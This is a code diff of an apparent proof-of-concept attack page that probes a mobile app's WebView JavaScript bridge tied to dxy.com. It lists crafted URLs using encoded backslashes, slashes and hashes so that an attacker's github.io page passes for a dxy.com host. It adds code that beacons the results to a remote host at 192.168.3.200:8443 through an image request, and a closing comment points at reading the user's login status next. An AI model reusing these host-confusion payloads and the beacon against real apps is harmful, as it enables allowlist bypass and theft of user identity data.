@@ -23,16 +23,22 @@ window.DXYJSBridge = {
 };
 
 L('href: ' + location.href);
-// ===== Chromium URL 解析器判定 (new URL = WebView 内核解析) =====
+
+L('AndroidJSBridger: ' + (typeof window.AndroidJSBridger));
+var acc = [];
 ['https://derham1999.github.io%5C.dxy.com/ai-daily/poc.html',
  'https://derham1999.github.io%2Fai-daily%5C.dxy.com/poc.html',
  'https://derham1999.github.io%23.dxy.com/x',
  'https://derham1999.github.io%2E.dxy.com/x'
-].forEach(function(u, i) {
-  try { var p = new URL(u); R('URLTEST'+i, u.substring(8,50) + ' => host=' + p.host + ' path=' + p.pathname); }
-  catch(e) { R('URLTEST'+i, u.substring(8,50) + ' => INVALID: ' + e.message); }
+].forEach(function(u) {
+  try { var p = new URL(u); acc.push(u.substring(8,45) + ' => host=' + p.host + ' path=' + p.pathname); }
+  catch(e) { acc.push(u.substring(8,45) + ' => INVALID'); }
 });
-L('AndroidJSBridger: ' + (typeof window.AndroidJSBridger)); R('ENV', 'bridger=' + (typeof window.AndroidJSBridger) + ' href=' + location.href);
+setTimeout(function() {
+  var msg = acc.join('  ||  ');
+  R('URLTESTS', msg);
+  try { new Image().src = 'https://192.168.3.200:8443/beacon?d=' + encodeURIComponent(msg); } catch(e) {}
+}, 500); R('ENV', 'bridger=' + (typeof window.AndroidJSBridger) + ' href=' + location.href);
 L('----------------------------------------');
 
 // 1) loginStatus → 用户身份
